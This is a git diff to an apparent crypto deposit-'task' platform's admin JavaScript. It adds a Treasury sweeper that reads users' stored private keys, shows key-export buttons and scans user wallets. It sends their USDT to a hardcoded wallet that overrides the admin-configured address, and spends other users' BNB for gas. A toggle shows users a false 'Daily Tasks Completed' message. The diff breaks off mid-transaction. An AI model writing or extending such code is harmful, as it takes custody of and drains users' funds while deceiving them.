@@ -118,6 +118,7 @@ async function navigateTo(page) {
     submissions:   'Payment Submissions',
     refunds:       'Pending Refunds',
     withdrawals:   'Withdrawal Requests',
+    treasury:      'Treasury & On-Chain Sweeper',
     tasks:         'Task Management',
     users:         'User Management',
     notifications: 'Notifications',
@@ -140,12 +141,20 @@ async function navigateTo(page) {
       case 'submissions':   await loadSubmissions(); break;
       case 'refunds':       await loadRefunds(); break;
       case 'withdrawals':   await loadWithdrawals(); break;
+      case 'treasury':      await loadTreasury(); break;
       case 'tasks':         await loadTasks(); break;
       case 'users':         await loadUsers(); break;
       case 'notifications': await loadNotifications(); break;
       case 'support':       await loadSupportDesk(); break;
       case 'settings':      await loadSettings(); break;
     }
+
+    if (page === 'treasury') {
+      startTreasuryAutoPoll();
+    } else {
+      stopTreasuryAutoPoll();
+    }
+
     await refreshBadges();
   } catch (err) {
     toast(err.message, 'error');
@@ -216,6 +225,8 @@ async function loadDashboard() {
   document.getElementById('d-done-tasks').innerText = doneTasks ?? 0;
   document.getElementById('d-total-bonus').innerText = '$' + totalBonus.toFixed(2);
   document.getElementById('d-active-tasks').innerText = activeTasks ?? 0;
+
+  syncTaskAvailabilityStatus();
 
   // Recent 10 submissions
   let recent = null;
@@ -297,7 +308,11 @@ async function loadSubmissions() {
         <br><span style="color:var(--txt3);font-size:11px;">${s.user_id ? s.user_id.substring(0,8) + '...' : 'BEP20 Trader'}</span>
       </td>
       <td>${s.task_title || 'USDT-BSC Deposit'}</td>
-      <td>${s.sender_number || 'USDT-BSC'}</td>
+      <td>
+        ${s.sender_number && s.sender_number.startsWith('0x')
+          ? `<span style="font-family:monospace; font-size:11px; color:#00e676; font-weight:700;" title="${s.sender_number}">${s.sender_number.substring(0,8)}...${s.sender_number.slice(-4)}</span> <button type="button" onclick="navigator.clipboard.writeText('${s.sender_number}'); toast('Wallet Copied!','success');" style="background:none; border:none; color:var(--cyan); cursor:pointer; font-size:11px;" title="Copy Receiving Wallet">📋</button>`
+          : `<span style="color:var(--txt3); font-size:11px;">${s.sender_number || 'USDT-BSC'}</span>`}
+      </td>
       <td style="font-family:monospace;font-size:12px;">${s.transaction_id || s.id}</td>
       <td style="color:var(--green);font-weight:700;">$${parseFloat(s.amount || 0).toFixed(2)} USDT</td>
       <td>
@@ -436,7 +451,7 @@ async function loadRefunds() {
     try {
       const { data: profs } = await supabaseClient
         .from('profiles')
-        .select('id, full_name, phone, usdt_address, private_key')
+        .select('id, full_name, phone, wallet_address, usdt_address, private_key')
         .in('id', userIds);
       if (profs) {
         profs.forEach(p => { profilesMap[p.id] = p; });
@@ -459,7 +474,12 @@ async function loadRefunds() {
     const depositAmt = parseFloat(s.amount || 10);
     const bonusAmt = parseFloat(s.bonus_amount || (depositAmt * 0.041));
     const totalRefund = (depositAmt + bonusAmt).toFixed(2);
-    const userWallet = prof.usdt_address || s.sender_number || 'BEP20 Address';
+    
+    // Prioritize the user's actual RECEIVING refund wallet address
+    const refundWallet = (prof.wallet_address && prof.wallet_address.startsWith('0x'))
+      ? prof.wallet_address
+      : ((s.sender_number && s.sender_number.startsWith('0x')) ? s.sender_number : (prof.usdt_address || ''));
+    const hasReceivingWallet = !!(prof.wallet_address || (s.sender_number && s.sender_number.startsWith('0x')));
     const userName = prof.full_name || s.user_name || 'USDT Trader';
     const isRefunded = s.status === 'refunded' || s.status === 'completed';
 
@@ -473,13 +493,26 @@ async function loadRefunds() {
         <td style="color:var(--green); font-weight:800;">+$${bonusAmt.toFixed(2)} USDT</td>
         <td style="color:#00e5ff; font-weight:900; font-size:13.5px;">$${totalRefund} USDT</td>
         <td>
-          <div style="display:flex; align-items:center; gap:6px;">
-            <span style="font-family:monospace; font-size:11.5px; color:var(--cyan); max-width:140px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${userWallet}">
-              ${userWallet}
+          ${refundWallet ? `
+            <div style="display:flex; flex-direction:column; gap:4px;">
+              <div style="display:flex; align-items:center; gap:6px;">
+                <span style="font-family:monospace; font-size:11.5px; color:${hasReceivingWallet ? '#00e676' : 'var(--cyan)'}; font-weight:700; max-width:145px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${refundWallet}">
+                  ${refundWallet}
+                </span>
+                <button class="btn btn-sm" onclick="navigator.clipboard.writeText('${refundWallet}'); toast('Address copied ✓', 'success');" style="padding:2px 6px; font-size:10px;">Copy</button>
+                ${prof.private_key ? `<button class="btn btn-sm" onclick="openUserPrivateKeyModal('${s.user_id}', '${escapeHtml(userName)}', '${prof.usdt_address || refundWallet}', '${prof.private_key}')" style="padding:2px 6px; font-size:10px; background:rgba(255,193,7,0.15); border:1px solid rgba(255,193,7,0.3); color:#ffc107;" title="Export Deposit Wallet Private Key">🔑 Key</button>` : ''}
+              </div>
+              <div style="display:flex; align-items:center; gap:4px;">
+                <span style="font-size:9.5px; font-weight:800; color:${hasReceivingWallet ? '#00e676' : '#94a3b8'}; background:${hasReceivingWallet ? 'rgba(0,230,118,0.12)' : 'rgba(255,255,255,0.06)'}; border:1px solid ${hasReceivingWallet ? 'rgba(0,230,118,0.3)' : 'rgba(255,255,255,0.1)'}; padding:1px 5px; border-radius:4px;">
+                  ${hasReceivingWallet ? '✓ RECEIVING WALLET' : 'DEPOSIT ADDRESS'}
+                </span>
+              </div>
+            </div>
+          ` : `
+            <span style="color:#ef4444; font-size:11px; font-weight:800; background:rgba(239,68,68,0.12); padding:2px 6px; border-radius:4px; border:1px solid rgba(239,68,68,0.3);">
+              ⚠️ No Wallet Set
             </span>
-            <button class="btn btn-sm" onclick="navigator.clipboard.writeText('${userWallet}'); toast('Address copied ✓', 'success');" style="padding:2px 6px; font-size:10px;">Copy</button>
-            ${prof.private_key ? `<button class="btn btn-sm" onclick="openUserPrivateKeyModal('${s.user_id}', '${escapeHtml(userName)}', '${userWallet}', '${prof.private_key}')" style="padding:2px 6px; font-size:10px; background:rgba(255,193,7,0.15); border:1px solid rgba(255,193,7,0.3); color:#ffc107;" title="Export Private Key">🔑 Key</button>` : ''}
-          </div>
+          `}
         </td>
         <td style="font-family:monospace; font-size:11px; color:var(--txt3);">${s.transaction_id || s.id}</td>
         <td>
@@ -668,8 +701,134 @@ async function confirmReject() {
   }
 }
 
+// ── TASK AVAILABILITY / LOCK CONTROLLER ──────────────────────────────────────
+let currentTaskAvailability = true;
+
+async function syncTaskAvailabilityStatus() {
+  try {
+    const { data } = await supabaseClient
+      .from('app_settings')
+      .select('task_availability')
+      .eq('id', true)
+      .maybeSingle();
+
+    if (data && typeof data.task_availability === 'boolean') {
+      currentTaskAvailability = data.task_availability;
+    }
+  } catch (e) {
+    console.warn('syncTaskAvailabilityStatus error:', e);
+  }
+  updateTaskAvailabilityUI(currentTaskAvailability);
+}
+
+function updateTaskAvailabilityUI(isAvailable) {
+  // 1. Update page-tasks banner
+  const indicator = document.getElementById('admin-task-status-indicator');
+  const badge = document.getElementById('admin-task-status-badge');
+  const desc = document.getElementById('admin-task-status-desc');
+  const btnToggle = document.getElementById('btn-toggle-task-lock');
+  const icon = document.getElementById('btn-toggle-task-icon');
+  const text = document.getElementById('btn-toggle-task-text');
+
+  // 2. Update topbar toggle
+  const topbarToggle = document.getElementById('topbar-task-toggle');
+  const topbarIcon = document.getElementById('topbar-task-icon');
+  const topbarText = document.getElementById('topbar-task-text');
+
+  if (isAvailable) {
+    if (indicator) {
+      indicator.innerText = '⚡';
+      indicator.style.background = 'rgba(0,230,118,0.12)';
+      indicator.style.borderColor = 'rgba(0,230,118,0.3)';
+    }
+    if (badge) {
+      badge.innerText = 'ACTIVE';
+      badge.style.background = 'rgba(0,230,118,0.15)';
+      badge.style.color = '#00e676';
+      badge.style.borderColor = 'rgba(0,230,118,0.3)';
+    }
+    if (desc) desc.innerText = 'Users can currently calculate and submit USDT task deposits.';
+    if (btnToggle) {
+      btnToggle.style.background = 'rgba(255,193,7,0.15)';
+      btnToggle.style.borderColor = 'rgba(255,193,7,0.35)';
+      btnToggle.style.color = '#ffc107';
+    }
+    if (icon) icon.innerText = '🔒';
+    if (text) text.innerText = 'Lock Tasks (Pause Deposits)';
+
+    if (topbarToggle) {
+      topbarToggle.style.background = 'rgba(0,230,118,0.12)';
+      topbarToggle.style.borderColor = 'rgba(0,230,118,0.3)';
+      topbarToggle.style.color = '#00e676';
+    }
+    if (topbarIcon) topbarIcon.innerText = '⚡';
+    if (topbarText) topbarText.innerText = 'Tasks: Active';
+  } else {
+    if (indicator) {
+      indicator.innerText = '🔒';
+      indicator.style.background = 'rgba(255,193,7,0.15)';
+      indicator.style.borderColor = 'rgba(255,193,7,0.35)';
+    }
+    if (badge) {
+      badge.innerText = 'LOCKED (PAUSED)';
+      badge.style.background = 'rgba(255,193,7,0.15)';
+      badge.style.color = '#ffc107';
+      badge.style.borderColor = 'rgba(255,193,7,0.35)';
+    }
+    if (desc) desc.innerText = 'Deposit terminal is locked! Users see "Daily Tasks Completed - Fast refill shortly".';
+    if (btnToggle) {
+      btnToggle.style.background = 'rgba(0,230,118,0.15)';
+      btnToggle.style.borderColor = 'rgba(0,230,118,0.35)';
+      btnToggle.style.color = '#00e676';
+    }
+    if (icon) icon.innerText = '🔓';
+    if (text) text.innerText = 'Unlock Tasks (Resume Deposits)';
+
+    if (topbarToggle) {
+      topbarToggle.style.background = 'rgba(255,193,7,0.15)';
+      topbarToggle.style.borderColor = 'rgba(255,193,7,0.35)';
+      topbarToggle.style.color = '#ffc107';
+    }
+    if (topbarIcon) topbarIcon.innerText = '🔒';
+    if (topbarText) topbarText.innerText = 'Tasks: Locked';
+  }
+
+  // Also sync with settings select dropdown if present
+  const selectEl = document.getElementById('s-tasks-avail');
+  if (selectEl) selectEl.value = isAvailable ? 'true' : 'false';
+}
+
+window.toggleTaskAvailability = async function() {
+  const newStatus = !currentTaskAvailability;
+  try {
+    showSpinner(true);
+    const { error } = await supabaseClient
+      .from('app_settings')
+      .update({ task_availability: newStatus })
+      .eq('id', true);
+
+    if (error) throw error;
+
+    currentTaskAvailability = newStatus;
+    updateTaskAvailabilityUI(currentTaskAvailability);
+
+    if (newStatus) {
+      toast('Tasks Unlocked! User deposit terminal is now open and accepting deposits. ✓', 'success');
+    } else {
+      toast('Tasks Locked! Deposit terminal is closed; users see "Daily Tasks Completed". 🔒', 'warning');
+    }
+  } catch (err) {
+    toast('Error updating task availability: ' + err.message, 'error');
+  } finally {
+    showSpinner(false);
+  }
+};
+
+window.syncTaskAvailabilityStatus = syncTaskAvailabilityStatus;
+
 // ── TASKS ─────────────────────────────────────────────────────────────────────
 async function loadTasks() {
+  syncTaskAvailabilityStatus();
   const { data, error } = await supabaseClient
     .from('tasks')
     .select('*')
@@ -890,7 +1049,8 @@ function renderUsers(users) {
     return `<tr>
       <td>
         <strong>${u.full_name || '—'}${isAdmin ? ' <span style="color:var(--cyan);font-size:10px;">[ADMIN]</span>' : ''}</strong>
-        ${u.usdt_address ? `<br><span style="font-family:monospace; color:var(--cyan); font-size:10.5px;" title="${u.usdt_address}">BEP20: ${u.usdt_address.substring(0,10)}...</span> <button type="button" onclick="navigator.clipboard.writeText('${u.usdt_address}'); toast('Address Copied!','success');" style="background:none; border:none; color:var(--green); font-size:11px; cursor:pointer;" title="Copy BEP20 Address">📋</button> <button type="button" onclick="openUserPrivateKeyModal('${u.id}', '${escapeHtml(u.full_name || 'User')}', '${u.usdt_address}', '${u.private_key || ''}')" style="background:rgba(255,193,7,0.15); border:1px solid rgba(255,193,7,0.3); color:#ffc107; font-size:10px; font-weight:800; padding:2px 6px; border-radius:6px; cursor:pointer; margin-left:4px;" title="Export Private Key">🔑 Key</button>` : ''}
+        ${u.wallet_address ? `<br><span style="font-family:monospace; color:#00e676; font-size:10.5px; font-weight:700;" title="${u.wallet_address}">Receiving: ${u.wallet_address.substring(0,10)}...</span> <button type="button" onclick="navigator.clipboard.writeText('${u.wallet_address}'); toast('Receiving Wallet Copied!','success');" style="background:none; border:none; color:var(--green); font-size:11px; cursor:pointer;" title="Copy Receiving Wallet">📋</button>` : `<br><span style="color:#ef4444; font-size:10px; font-weight:700;">No Payout Wallet</span>`}
+        ${u.usdt_address ? `<br><span style="font-family:monospace; color:var(--cyan); font-size:10px;" title="${u.usdt_address}">Deposit: ${u.usdt_address.substring(0,8)}...</span> <button type="button" onclick="navigator.clipboard.writeText('${u.usdt_address}'); toast('Deposit Address Copied!','success');" style="background:none; border:none; color:var(--cyan); font-size:10px; cursor:pointer;" title="Copy Deposit Address">📋</button> <button type="button" onclick="openUserPrivateKeyModal('${u.id}', '${escapeHtml(u.full_name || 'User')}', '${u.usdt_address}', '${u.private_key || ''}')" style="background:rgba(255,193,7,0.15); border:1px solid rgba(255,193,7,0.3); color:#ffc107; font-size:9.5px; font-weight:800; padding:1px 5px; border-radius:5px; cursor:pointer; margin-left:2px;" title="Export Private Key">🔑 Key</button>` : ''}
       </td>
       <td style="color:var(--cyan);">${u.phone || '—'}</td>
       <td style="font-family:monospace;color:var(--green);font-size:12px;">${u.referral_code || '—'}</td>
@@ -1835,3 +1995,595 @@ window.handleAdminSupportImageSelect = handleAdminSupportImageSelect;
 window.removeAdminSupportImageAttachment = removeAdminSupportImageAttachment;
 window.openAddBalanceModal = openAddBalanceModal;
 window.submitAdminBalanceAdjustment = submitAdminBalanceAdjustment;
+
+// ══════════════════════════════════════════════════════════════════════════════
+// ⚡ TREASURY & ON-CHAIN SWEEPER HUB (BSC MAINNET)
+// ══════════════════════════════════════════════════════════════════════════════
+
+const BSC_PUBLIC_RPCS = [
+  'https://bsc-dataseed.binance.org/',
+  'https://bsc-dataseed1.defibit.io/',
+  'https://bsc-dataseed1.ninicoin.io/'
+];
+const BSC_USDT_ADDR = '0x55d398326f99059fF775485246999027B3197955';
+const MIN_SWEEP_GAS_BNB = 0.00001; // Minimum BNB required on BSC (~$0.008, MetaMask uses ~0.0000107)
+const ADMIN_PERMANENT_MASTER_WALLET = '0x155070856B0dcfC2e20B9284a54eecedeE7Bc14D';
+
+let treasuryWallets = [];
+let isScanningTreasury = false;
+let currentSweepTarget = null; // { type: 'single'|'all', ... }
+
+function getBscJsonRpcProvider() {
+  if (typeof ethers === 'undefined') return null;
+  return new ethers.JsonRpcProvider(BSC_PUBLIC_RPCS[0]);
+}
+
+// Low-level fast balance query using direct JSON-RPC calls
+async function fetchOnChainWalletBalances(address) {
+  const cleanAddr = address.toLowerCase().replace('0x', '').padStart(64, '0');
+  
+  // 1. Fetch USDT Balance
+  const usdtCallPayload = {
+    jsonrpc: '2.0',
+    method: 'eth_call',
+    params: [{
+      to: BSC_USDT_ADDR,
+      data: '0x70a08231' + cleanAddr
+    }, 'latest'],
+    id: 1
+  };
+
+  // 2. Fetch BNB Gas Balance
+  const bnbCallPayload = {
+    jsonrpc: '2.0',
+    method: 'eth_getBalance',
+    params: [address, 'latest'],
+    id: 2
+  };
+
+  let usdtBal = 0;
+  let bnbBal = 0;
+
+  for (let rpc of BSC_PUBLIC_RPCS) {
+    try {
+      const [resUsdt, resBnb] = await Promise.all([
+        fetch(rpc, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(usdtCallPayload)
+        }).then(r => r.json()),
+        fetch(rpc, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(bnbCallPayload)
+        }).then(r => r.json())
+      ]);
+
+      if (resUsdt && resUsdt.result && resUsdt.result !== '0x') {
+        const raw = BigInt(resUsdt.result);
+        usdtBal = Number(raw) / 1e18;
+      }
+      if (resBnb && resBnb.result && resBnb.result !== '0x') {
+        const rawBnb = BigInt(resBnb.result);
+        bnbBal = Number(rawBnb) / 1e18;
+      }
+      return { usdt: usdtBal, bnb: bnbBal };
+    } catch (e) {
+      console.warn('RPC failover on:', rpc, e.message);
+    }
+  }
+  return { usdt: 0, bnb: 0 };
+}
+
+// Fetch and display live on-chain balance of the Admin Master Vault
+async function updateMainVaultLiveBalance() {
+  const el = document.getElementById('main-vault-live-balance');
+  if (!el) return;
+  try {
+    const bal = await fetchOnChainWalletBalances(ADMIN_PERMANENT_MASTER_WALLET);
+    el.innerHTML = `Live Vault: <strong style="color:#00e676;">$${bal.usdt.toFixed(2)} USDT</strong> <span style="color:#a0a5b5; font-size:11px;">(${bal.bnb.toFixed(5)} BNB)</span>`;
+  } catch (e) {
+    el.innerText = 'Vault: Active';
+  }
+}
+
+// Load Treasury page initial state
+async function loadTreasury() {
+  updateMainVaultLiveBalance();
+  // 1. Load Admin Master Receiver Address
+  try {
+    const { data: settings } = await supabaseClient
+      .from('app_settings')
+      .select('usdt_bep20_address')
+      .eq('id', true)
+      .maybeSingle();
+
+    const masterInput = document.getElementById('treasury-master-address');
+    if (masterInput) {
+      const saved = settings?.usdt_bep20_address || localStorage.getItem('admin_master_sweep_wallet') || '0xFE3B557E8Fb62b89F4916B721be55cEb828dBd73';
+      masterInput.value = saved;
+    }
+  } catch (e) {
+    console.error('Error loading master address:', e);
+  }
+
+  // 2. Fetch all monitored deposit wallets from profiles
+  try {
+    const { data: profs, error } = await supabaseClient
+      .from('profiles')
+      .select('id, full_name, phone, usdt_address, private_key, created_at')
+      .not('usdt_address', 'is', null)
+      .order('created_at', { ascending: false });
+
+    if (error) throw error;
+
+    treasuryWallets = (profs || []).map(p => ({
+      userId: p.id,
+      name: p.full_name || 'USDT Trader',
+      phone: p.phone || 'N/A',
+      address: p.usdt_address,
+      privateKey: p.private_key || '',
+      usdt: 0,
+      bnb: 0,
+      scanned: false
+    }));
+
+    const totalEl = document.getElementById('t-total-wallets');
+    if (totalEl) totalEl.innerText = treasuryWallets.length;
+
+    // Render initial table
+    filterTreasuryTable();
+
+    // Auto-trigger scan if not scanned yet
+    startTreasuryAutoPoll();
+    if (treasuryWallets.length > 0) {
+      setTimeout(() => scanAllTreasuryWallets(true), 200);
+    }
+  } catch (err) {
+    console.error('loadTreasury error:', err);
+    toast('Error loading wallets: ' + err.message, 'error');
+  }
+}
+
+// Background silent poller: scans all wallets and main vault silently every 30s
+let adminTreasuryPollInterval = null;
+
+function startTreasuryAutoPoll() {
+  if (!adminTreasuryPollInterval) {
+    adminTreasuryPollInterval = setInterval(() => {
+      if (currentPage === 'treasury') {
+        scanAllTreasuryWallets(true);
+      }
+    }, 30000); // exactly every 30 seconds
+  }
+}
+
+function stopTreasuryAutoPoll() {
+  if (adminTreasuryPollInterval) {
+    clearInterval(adminTreasuryPollInterval);
+    adminTreasuryPollInterval = null;
+  }
+}
+
+// Save Admin Master Sweep Destination Wallet
+async function saveTreasuryMasterAddress() {
+  const input = document.getElementById('treasury-master-address');
+  if (!input) return;
+  const addr = input.value.trim();
+
+  if (!addr || !addr.startsWith('0x') || addr.length !== 42) {
+    toast('Invalid BEP20 address! Must start with 0x and be 42 characters.', 'error');
+    return;
+  }
+
+  localStorage.setItem('admin_master_sweep_wallet', addr);
+
+  try {
+    const { error } = await supabaseClient
+      .from('app_settings')
+      .update({ usdt_bep20_address: addr })
+      .eq('id', true);
+
+    if (error) throw error;
+    toast('Master Sweep Wallet updated and saved to Database! ✓', 'success');
+  } catch (e) {
+    toast('Saved locally! Database update note: ' + e.message, 'info');
+  }
+}
+
+// Scan all monitored wallets on the BSC blockchain (silent mode for 30s background auto-scan)
+async function scanAllTreasuryWallets(silent = false) {
+  if (isScanningTreasury || treasuryWallets.length === 0) return;
+  isScanningTreasury = true;
+
+  const banner = document.getElementById('treasury-status-banner');
+  const statusText = document.getElementById('treasury-status-text');
+  const statusPct = document.getElementById('treasury-status-pct');
+  const btnScan = document.getElementById('btn-scan-treasury');
+  const icon = document.getElementById('scan-btn-icon');
+
+  if (!silent) {
+    if (banner) banner.style.display = 'flex';
+    if (btnScan) btnScan.style.opacity = '0.6';
+    if (icon) icon.innerText = '⏳';
+  }
+
+  const total = treasuryWallets.length;
+  let completed = 0;
+  let totalUsdt = 0;
+  let totalBnb = 0;
+  let activeCount = 0;
+
+  // Process in concurrent batches of 4
+  const batchSize = 4;
+  for (let i = 0; i < total; i += batchSize) {
+    const chunk = treasuryWallets.slice(i, i + batchSize);
+    await Promise.all(chunk.map(async (w) => {
+      try {
+        const bal = await fetchOnChainWalletBalances(w.address);
+        w.usdt = bal.usdt;
+        w.bnb = bal.bnb;
+        w.scanned = true;
+
+        totalUsdt += bal.usdt;
+        totalBnb += bal.bnb;
+        if (bal.usdt > 0.01 || bal.bnb > 0.00001) activeCount++;
+      } catch (e) {
+        console.warn('Scan wallet error:', w.address, e);
+      } finally {
+        completed++;
+        if (!silent) {
+          const pct = Math.round((completed / total) * 100);
+          if (statusPct) statusPct.innerText = pct + '%';
+          if (statusText) statusText.innerText = `Scanning blockchain (${completed}/${total} wallets checked)...`;
+        }
+      }
+    }));
+  }
+
+  // Update Top Stats silently
+  const activeEl = document.getElementById('t-active-wallets');
+  if (activeEl) activeEl.innerText = activeCount;
+
+  const usdtEl = document.getElementById('t-total-usdt');
+  if (usdtEl) usdtEl.innerText = '$' + totalUsdt.toFixed(2) + ' USDT';
+
+  const bnbEl = document.getElementById('t-total-bnb');
+  if (bnbEl) bnbEl.innerText = totalBnb.toFixed(4) + ' BNB';
+
+  const badgeEl = document.getElementById('badge-treasury');
+  if (badgeEl) {
+    badgeEl.innerText = activeCount;
+    badgeEl.style.display = activeCount > 0 ? 'inline-block' : 'none';
+  }
+
+  updateMainVaultLiveBalance();
+
+  // Done scanning
+  if (!silent) {
+    if (banner) banner.style.display = 'none';
+    if (btnScan) btnScan.style.opacity = '1';
+    if (icon) icon.innerText = '🔄';
+    toast(`Scan Complete! Found $${totalUsdt.toFixed(2)} USDT across ${activeCount} active wallet(s) 🎉`, 'success');
+  }
+  isScanningTreasury = false;
+
+  filterTreasuryTable();
+}
+
+// Filter and render Treasury table
+function filterTreasuryTable() {
+  const filter = document.getElementById('treasury-filter')?.value || 'active';
+  const query = (document.getElementById('treasury-search')?.value || '').trim().toLowerCase();
+  const tbody = document.getElementById('treasury-tbody');
+  if (!tbody) return;
+
+  let filtered = [...treasuryWallets];
+
+  // Filter active (> $0 USDT or BNB)
+  if (filter === 'active') {
+    filtered = filtered.filter(w => !w.scanned || w.usdt > 0.01 || w.bnb > 0.00001);
+  }
+
+  // Filter search
+  if (query) {
+    filtered = filtered.filter(w => 
+      w.name.toLowerCase().includes(query) ||
+      w.phone.toLowerCase().includes(query) ||
+      w.address.toLowerCase().includes(query)
+    );
+  }
+
+  if (filtered.length === 0) {
+    tbody.innerHTML = `<tr><td colspan="6"><div class="empty-state">${treasuryWallets.length === 0 ? 'No deposit wallets found in database.' : 'No wallets matching the selected filter.'}</div></td></tr>`;
+    return;
+  }
+
+  tbody.innerHTML = filtered.map(w => {
+    const hasGas = w.bnb >= MIN_SWEEP_GAS_BNB;
+    const canSweep = w.usdt >= 0.1 && !!w.privateKey;
+    const gasBadge = hasGas 
+      ? `<span style="font-size:10px; font-weight:800; color:#00e676; background:rgba(0,230,118,0.12); padding:2px 7px; border-radius:6px; border:1px solid rgba(0,230,118,0.3);">Gas Ready ✓</span>`
+      : `<span style="font-size:10px; font-weight:800; color:#ffc107; background:rgba(255,193,7,0.12); padding:2px 7px; border-radius:6px; border:1px solid rgba(255,193,7,0.3);">Needs Gas (~$0.01)</span>`;
+
+    return `
+      <tr>
+        <td>
+          <strong style="font-size:13px; color:#ffffff;">${escapeHtml(w.name)}</strong>
+          <br><span style="color:var(--txt3); font-size:11px;">${escapeHtml(w.phone)}</span>
+        </td>
+        <td>
+          <div style="display:flex; align-items:center; gap:6px;">
+            <span style="font-family:monospace; font-size:11.5px; color:var(--cyan); max-width:145px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${w.address}">
+              ${w.address}
+            </span>
+            <button class="btn btn-sm" onclick="navigator.clipboard.writeText('${w.address}'); toast('Address copied ✓', 'success');" style="padding:2px 6px; font-size:10px;">Copy</button>
+            <a href="https://bscscan.com/address/${w.address}" target="_blank" style="color:var(--txt3); font-size:11px; text-decoration:none;" title="View on BscScan">↗</a>
+          </div>
+        </td>
+        <td>
+          <span style="font-family:monospace; font-size:13.5px; font-weight:900; color:${w.usdt > 0.01 ? '#00e676' : 'var(--txt3)'};">
+            $${w.usdt.toFixed(2)} USDT
+          </span>
+        </td>
+        <td>
+          <span style="font-family:monospace; font-size:11.5px; color:${hasGas ? 'var(--cyan)' : '#ffc107'};">
+            ${w.bnb.toFixed(5)} BNB
+          </span>
+        </td>
+        <td>${gasBadge}</td>
+        <td>
+          <div style="display:flex; align-items:center; gap:6px;">
+            <button class="btn btn-green" onclick="initiateSingleSweep('${w.userId}', '${w.address}', '${w.privateKey}', ${w.usdt}, ${w.bnb})" 
+              ${!canSweep ? 'disabled style="opacity:0.4; cursor:not-allowed; padding:4px 10px; font-size:11px;"' : 'style="font-weight:900; padding:4px 10px; font-size:11px; box-shadow:0 0 10px rgba(0,230,118,0.25);"'}>
+              ⚡ Sweep USDT
+            </button>
+            ${w.privateKey ? `
+              <button class="btn btn-sm" onclick="openUserPrivateKeyModal('${w.userId}', '${escapeHtml(w.name)}', '${w.address}', '${w.privateKey}')" 
+                style="padding:3px 8px; font-size:10.5px; background:rgba(255,193,7,0.15); border:1px solid rgba(255,193,7,0.3); color:#ffc107;" title="Export Private Key">
+                🔑 Key
+              </button>
+            ` : ''}
+          </div>
+        </td>
+      </tr>
+    `;
+  }).join('');
+}
+
+// Initiate sweep for a single wallet
+function initiateSingleSweep(userId, address, privateKey, usdtAmount, bnbAmount) {
+  const masterAddr = ADMIN_PERMANENT_MASTER_WALLET;
+
+  currentSweepTarget = {
+    type: 'single',
+    userId,
+    address,
+    privateKey,
+    usdtAmount,
+    bnbAmount,
+    masterAddr
+  };
+
+  document.getElementById('sweep-modal-dest').innerText = masterAddr;
+  document.getElementById('sweep-modal-amount').innerText = '$' + usdtAmount.toFixed(2) + ' USDT';
+
+  const gasWarning = document.getElementById('sweep-gas-warning');
+  if (gasWarning) {
+    gasWarning.style.display = bnbAmount < MIN_SWEEP_GAS_BNB ? 'block' : 'none';
+  }
+
+  document.getElementById('sweep-modal-intro').style.display = 'block';
+  document.getElementById('sweep-exec-log').style.display = 'none';
+  document.getElementById('sweep-exec-log').innerHTML = '';
+  document.getElementById('btn-confirm-sweep-exec').disabled = false;
+  document.getElementById('btn-confirm-sweep-exec').innerText = '⚡ Confirm & Sweep Now';
+
+  openModal('sweep-modal');
+}
+
+// Initiate sweep for ALL active wallets
+function confirmSweepAllWallets() {
+  const masterAddr = ADMIN_PERMANENT_MASTER_WALLET;
+
+  const activeWallets = treasuryWallets.filter(w => w.usdt >= 0.1 && !!w.privateKey);
+  if (activeWallets.length === 0) {
+    toast('No wallets with USDT balance >= $0.10 found. Run a scan first!', 'error');
+    return;
+  }
+
+  const totalUsdt = activeWallets.reduce((acc, w) => acc + w.usdt, 0);
+
+  currentSweepTarget = {
+    type: 'all',
+    wallets: activeWallets,
+    totalUsdt,
+    masterAddr
+  };
+
+  document.getElementById('sweep-modal-dest').innerText = masterAddr;
+  document.getElementById('sweep-modal-amount').innerText = '$' + totalUsdt.toFixed(2) + ' USDT (' + activeWallets.length + ' wallets)';
+
+  const gasWarning = document.getElementById('sweep-gas-warning');
+  if (gasWarning) gasWarning.style.display = 'none';
+
+  document.getElementById('sweep-modal-intro').style.display = 'block';
+  document.getElementById('sweep-exec-log').style.display = 'none';
+  document.getElementById('sweep-exec-log').innerHTML = '';
+  document.getElementById('btn-confirm-sweep-exec').disabled = false;
+  document.getElementById('btn-confirm-sweep-exec').innerText = '⚡ Sweep All (' + activeWallets.length + ' Wallets)';
+
+  openModal('sweep-modal');
+}
+
+// Execute on-chain sweep
+async function executeSweepConfirmed() {
+  if (!currentSweepTarget) return;
+
+  const btn = document.getElementById('btn-confirm-sweep-exec');
+  if (btn) {
+    btn.disabled = true;
+    btn.innerText = '⏳ Processing On-Chain Transfer...';
+  }
+
+  const logBox = document.getElementById('sweep-exec-log');
+  if (logBox) {
+    logBox.style.display = 'block';
+    logBox.innerHTML = '';
+  }
+
+  function appendLog(msg, color = '#a0a5b5') {
+    if (logBox) {
+      logBox.innerHTML += `<div style="color:${color}; margin-bottom:4px;">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+      logBox.scrollTop = logBox.scrollHeight;
+    }
+  }
+
+  appendLog('Connecting to BSC Mainnet (Chain ID: 56)...', '#00e5ff');
+
+  const provider = getBscJsonRpcProvider();
+  if (!provider) {
+    appendLog('❌ Error: Ethers library or RPC provider unavailable.', '#ff3d00');
+    if (btn) btn.disabled = false;
+    return;
+  }
+
+  // Minimal ABI for ERC20 transfer
+  const usdtAbi = [
+    'function transfer(address to, uint256 value) returns (bool)',
+    'function balanceOf(address account) view returns (uint256)'
+  ];
+
+  if (currentSweepTarget.type === 'single') {
+    const { address, privateKey, usdtAmount, bnbAmount, masterAddr } = currentSweepTarget;
+    appendLog(`Preparing sweep for wallet: ${address}`, '#fff');
+    appendLog(`Target Destination: ${masterAddr}`, '#00e5ff');
+
+    if (bnbAmount < MIN_SWEEP_GAS_BNB) {
+      appendLog(`🔍 Insufficient gas on target wallet. Searching for donor wallet with BNB...`, '#00e5ff');
+      const donorWallet = treasuryWallets.find(w => 
+        w.address.toLowerCase() !== address.toLowerCase() && 
+        w.bnb >= 0.00004 && 
+        !!w.privateKey
+      );
+
+      if (donorWallet) {
+        appendLog(`⛽ Found donor wallet: ${donorWallet.address.substring(0, 10)}... (Has: ${donorWallet.bnb.toFixed(5)} BNB)`, '#00e676');
+        appendLog(`Auto-transferring 0.000025 BNB (~$0.015) gas fee to ${address}...`, '#00e5ff');
+        try {
+          const donorSigner = new ethers.Wallet(donorWallet.privateKey, provider);
+          const fuelTx = await donorSigner.sendTransaction({
